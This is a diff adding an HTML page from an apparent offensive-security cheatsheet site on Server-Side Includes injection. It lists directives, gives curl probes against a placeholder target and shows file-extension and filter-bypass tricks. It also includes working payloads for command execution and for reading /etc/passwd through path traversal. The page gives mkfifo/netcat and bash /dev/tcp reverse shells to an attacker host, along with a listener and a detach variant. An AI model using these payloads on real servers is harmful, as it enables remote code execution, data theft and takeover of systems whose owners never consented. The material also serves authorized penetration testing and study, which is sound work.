@@ -1,0 +1,140 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SSI Injection · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../../index.html">Cheatsheets</a> › Web › Server-Side</nav><h1>SSI Injection</h1><p class="cx-lede">Server-Side Includes injection - directive catalog, detection methodology, RCE via mod_include</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1505.003, T1059</span><span class="cx-tag">D3FEND D3-MH, D3-ACH, D3-PSA</span><span class="cx-tag">IMPACT RCE, ServerSideEval</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Apache's <code>mod_include</code> (and IIS equivalents) parses HTML files for <code>&lt;!--#... --&gt;</code> directives at serve time. When user input lands in such a file <em>and</em> SSI is enabled for that file extension, you can inject directives that execute commands, include files, or print environment variables.</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;                              &lt;!-- detection --&gt;
+&lt;!--#printenv --&gt;                                            &lt;!-- env dump --&gt;
+&lt;!--#exec cmd=&quot;id&quot; --&gt;                                       &lt;!-- RCE --&gt;
+&lt;!--#include virtual=&quot;/etc/passwd&quot; --&gt;                       &lt;!-- file read (limited) --&gt;</code></pre></figure>
+<p>Success indicator: the directive is replaced by its output instead of being rendered as a comment.</p>
+<h2 id="where-to-look">Where to look</h2>
+<p>Three conditions for SSI exploitation:</p>
+<ol>
+<li><strong>The file extension is configured for SSI parsing.</strong> Default Apache: <code>.shtml</code>, <code>.shtm</code>, <code>.stm</code>. Non-default configs sometimes enable SSI on <code>.html</code>.</li>
+<li><strong>User input ends up inside the served file.</strong> Either persisted (saved to disk and served back) or reflected (template that bakes input into output).</li>
+<li><strong>The output is fetched back through Apache</strong> (not as a static download; it has to go through <code>mod_include</code>).</li>
+</ol>
+<p>Common targets: feedback forms, profile bios, comment systems, file-upload features that store user content in a docroot directory served by Apache, error pages that include the requested URL.</p>
+<h2 id="directive-reference">Directive reference</h2>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Print local time --&gt;
+&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;
+
+&lt;!-- Print environment variables --&gt;
+&lt;!--#printenv --&gt;
+&lt;!--#echo var=&quot;HTTP_USER_AGENT&quot; --&gt;
+&lt;!--#echo var=&quot;DOCUMENT_ROOT&quot; --&gt;
+&lt;!--#echo var=&quot;REMOTE_ADDR&quot; --&gt;
+
+&lt;!-- File modification time --&gt;
+&lt;!--#flastmod file=&quot;index.html&quot; --&gt;
+
+&lt;!-- Include another file (relative to document) --&gt;
+&lt;!--#include file=&quot;header.html&quot; --&gt;
+
+&lt;!-- Include another URL (relative to docroot) --&gt;
+&lt;!--#include virtual=&quot;/footer.html&quot; --&gt;
+
+&lt;!-- CGI execution --&gt;
+&lt;!--#include virtual=&quot;/cgi-bin/script.pl&quot; --&gt;
+
+&lt;!-- Direct command execution --&gt;
+&lt;!--#exec cmd=&quot;id&quot; --&gt;
+&lt;!--#exec cmd=&quot;ls -la /&quot; --&gt;
+
+&lt;!-- Set variables --&gt;
+&lt;!--#set var=&quot;x&quot; value=&quot;hello&quot; --&gt;
+&lt;!--#echo var=&quot;x&quot; --&gt;
+
+&lt;!-- Configuration --&gt;
+&lt;!--#config errmsg=&quot;custom error&quot; --&gt;
+&lt;!--#config timefmt=&quot;%Y-%m-%d&quot; --&gt;</code></pre></figure>
+<h2 id="detection">Detection</h2>
+<h3 id="step-1-probe-with-a-benign-directive">Step 1 - Probe with a benign directive</h3>
+<p>Submit <code>&lt;!--#echo var="DATE_LOCAL" --&gt;</code> into any input that gets reflected. If the response shows a date instead of the literal directive, SSI is parsing your input.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -X POST -d &#x27;name=&lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt;&#x27; http://&lt;TARGET&gt;/profile</code></pre></figure>
+<p>Look for behavior like:</p>
+<ul>
+<li>Input field shows: <code>Saturday, 04-May-2024 10:30:00 EDT</code> instead of the comment</li>
+<li>Comments stripped from output (mod_include consumed them)</li>
+<li>Response time changes (directive evaluation takes longer)</li>
+</ul>
+<h3 id="step-2-confirm-with-printenv-">Step 2 - Confirm with <code>&lt;!--#printenv --&gt;</code></h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -X POST -d &#x27;name=&lt;!--#printenv --&gt;&#x27; http://&lt;TARGET&gt;/profile</code></pre></figure>
+<p>If environment variables appear (<code>HTTP_HOST</code>, <code>SERVER_SOFTWARE</code>, <code>DOCUMENT_ROOT</code>, <code>REMOTE_ADDR</code>, etc.), SSI is fully active.</p>
+<h3 id="step-3-test-for-exec">Step 3 - Test for <code>#exec</code></h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -X POST -d &#x27;name=&lt;!--#exec cmd=&quot;id&quot; --&gt;&#x27; http://&lt;TARGET&gt;/profile</code></pre></figure>
+<p><code>#exec</code> is sometimes disabled (<code>Options +Includes</code> allows directives but excludes <code>IncludesNOEXEC</code> blocks <code>#exec</code>). If <code>#echo</code> works but <code>#exec</code> returns the literal text or an error, you have file inclusion only - no RCE.</p>
+<h2 id="file-extension-tricks">File extension tricks</h2>
+<p>The biggest constraint on SSI is the file extension. The user input must end up in a file Apache parses for SSI.</p>
+<h3 id="when-the-app-saves-input-as-shtml">When the app saves input as <code>.shtml</code></h3>
+<p>Direct path: input goes into a <code>.shtml</code> file, Apache parses it on serve.</p>
+<h3 id="when-the-app-saves-input-as-html">When the app saves input as <code>.html</code></h3>
+<p>Some non-default configs enable SSI on <code>.html</code>:</p>
+<figure class="cx-code"><figcaption>apache</figcaption><pre><code class="language-apache">AddType text/html .html
+AddOutputFilter INCLUDES .html</code></pre></figure>
+<p>Test by reading the response headers (<code>Content-Type</code>, sometimes a <code>X-Powered-By</code>) - if SSI is generic-on, the directive will be parsed.</p>
+<h3 id="when-the-app-sanitizes-the-input-file-extension-but-lets-you-choose">When the app sanitizes the input file extension but lets you choose</h3>
+<p>If you can upload files with chosen extensions:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Upload as .shtml - gets parsed when served back
+upload: payload.shtml
+content: &lt;html&gt;&lt;body&gt;&lt;!--#exec cmd=&quot;id&quot; --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></figure>
+<h3 id="trailing-newline-trick">Trailing-newline trick</h3>
+<p>Apache (and SSI) requires the directive to be on a complete line ending in newline. Some sanitizers strip trailing whitespace or newline. Pad with extra characters:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#exec cmd=&quot;id&quot; --&gt;
+                                        (trailing space + newline preserved)</code></pre></figure>
+<h2 id="rce-via-exec">RCE via <code>#exec</code></h2>
+<p>When <code>#exec</code> is enabled:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#exec cmd=&quot;id&quot; --&gt;
+&lt;!--#exec cmd=&quot;cat /etc/passwd&quot; --&gt;
+&lt;!--#exec cmd=&quot;ls -la /var/www&quot; --&gt;</code></pre></figure>
+<p>Output is inlined into the response where the directive was. Multi-line output appears multi-line.</p>
+<h3 id="reverse-shell">Reverse shell</h3>
+<p>When <code>#exec</code> is enabled but you can't get a TTY-style interactive shell directly:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#exec cmd=&quot;mkfifo /tmp/f;nc &lt;LHOST&gt; &lt;LPORT&gt; 0&lt;/tmp/f|/bin/bash 1&gt;/tmp/f;rm /tmp/f&quot; --&gt;</code></pre></figure>
+<p>Listener:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">nc -lvnp &lt;LPORT&gt;</code></pre></figure>
+<p>Why the FIFO trick: many distro <code>nc</code> builds (notably OpenBSD-netcat on Debian) don't ship with <code>-e</code>. The mkfifo construction reads from the FIFO into a shell, pipes shell output back through nc - bidirectional connection without <code>-e</code>.</p>
+<p>If <code>bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1</code> works, prefer it (cleaner, no FIFO file left behind):</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#exec cmd=&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;&quot; --&gt;</code></pre></figure>
+<h2 id="file-inclusion-via-include">File inclusion via <code>#include</code></h2>
+<p>When <code>#exec</code> is disabled but <code>#include</code> works:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#include virtual=&quot;/etc/passwd&quot; --&gt;
+&lt;!--#include file=&quot;../../../etc/passwd&quot; --&gt;</code></pre></figure>
+<p><code>virtual="/path"</code> is relative to docroot; <code>file="path"</code> is relative to the file being parsed.</p>
+<p>Path traversal works for <code>file=</code>:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#include file=&quot;../../../../etc/passwd&quot; --&gt;</code></pre></figure>
+<p>For <code>virtual=</code>, traversal is restricted but cross-app inclusion is possible:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#include virtual=&quot;/admin/secret-page.html&quot; --&gt;</code></pre></figure>
+<p>If the admin page is accessible only from localhost via mod-include, and your input file is served externally, you've crossed an access-control boundary.</p>
+<h3 id="cgi-invocation-via-include-virtual">CGI invocation via <code>#include virtual</code></h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#include virtual=&quot;/cgi-bin/test.pl&quot; --&gt;</code></pre></figure>
+<p>Re-invokes a CGI script from within mod_include's parser. Sometimes useful for accessing CGI scripts that aren't directly exposed.</p>
+<h2 id="filter-bypass">Filter bypass</h2>
+<p>Sanitizers commonly block <code>&lt;!--#</code>. Variants that sometimes survive:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--   #exec cmd=&quot;id&quot; --&gt;                       &lt;!-- extra spaces --&gt;
+&lt;!--#EXEC cmd=&quot;id&quot; --&gt;                          &lt;!-- case (rarely matters) --&gt;
+&lt;!--   #include virtual=&quot;/etc/passwd&quot; --&gt;</code></pre></figure>
+<p>If <code>&lt;!--</code> is filtered entirely, SSI is not exploitable - there's no other way to start a directive.</p>
+<p>If specific directives are filtered (<code>exec</code>), <code>&lt;!--#include virtual="/cgi-bin/anything"--&gt;</code> may still work if a CGI is reachable.</p>
+<h2 id="iis-style-ssi">IIS-style SSI</h2>
+<p>IIS supports a similar feature, with Windows-specific commands:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!--#exec cmd=&quot;dir C:\&quot; --&gt;
+&lt;!--#exec cmd=&quot;type C:\Users\Administrator\Desktop\flag.txt&quot; --&gt;</code></pre></figure>
+<p>The <code>cmd</code> argument runs through cmd.exe, so cmd-style chaining (<code>&amp;</code>, <code>&amp;&amp;</code>) and Windows path syntax apply.</p>
+<h2 id="common-failure-modes">Common failure modes</h2>
+<ul>
+<li><strong>Directive appears literally in output.</strong> SSI not enabled for this file extension. Check <code>Content-Type</code> - if <code>text/html</code> and the file has <code>.html</code> extension, SSI is probably off. Look for upload features where you can choose <code>.shtml</code>.</li>
+<li><strong><code>#echo</code> works but <code>#exec</code> returns nothing.</strong> <code>IncludesNOEXEC</code> set in Apache config - file inclusion enabled, command execution disabled. Limited but useful (file disclosure, env vars).</li>
+<li><strong>Directive consumed but no output.</strong> mod_include parsed it and produced empty output (e.g., <code>#config</code> directives produce no output). Try <code>#echo</code> or <code>#exec</code> for visible output.</li>
+<li><strong>Reverse shell connects but dies immediately.</strong> Apache's child process is short-lived; the shell forks but the parent process exits quickly. Detach: <code>&lt;!--#exec cmd="(nohup bash -c '...' &amp;) &gt; /dev/null 2&gt;&amp;1" --&gt;</code>.</li>
+<li><strong>Some directives blocked, others allowed.</strong> Custom mod_include filter or WAF in path. Pivot to whichever directive isn't blocked - <code>#include</code> for file disclosure, <code>#echo</code> for env exfil.</li>
+<li><strong>Input length limit too short for full directive.</strong> Multi-stage inject: write directive across multiple inputs that get concatenated, or use a shorter directive form.</li>
+</ul>
+<h2 id="notes">Notes</h2>
+<p>SSI is a legacy technology - most modern stacks (Node, Go, modern PHP frameworks) don't use it. The bug class persists because: (1) Apache's default config still ships SSI support, (2) <code>.shtml</code> files exist in the wild from old codebases, (3) some shared hosting providers leave SSI on by default. When you find SSI exploitation in 2025+, it's usually a vintage codebase or a misconfigured shared-hosting deployment.</p>
+<p>Where SSI does work, it's a fast path to RCE: detect with <code>&lt;!--#printenv --&gt;</code>, escalate with <code>&lt;!--#exec cmd="id" --&gt;</code>. The whole chain takes minutes if the conditions align.</p></article><nav class="cx-pager"><a class="cx-prev" href="../../intermediary/index.html">Previous: AJP &amp; Tomcat</a><a class="cx-next" href="../../ssrf/index.html">Next: SSRF</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../../license.html">License</a></p></footer>
+<script src="../../../../../codex.js"></script></body></html>
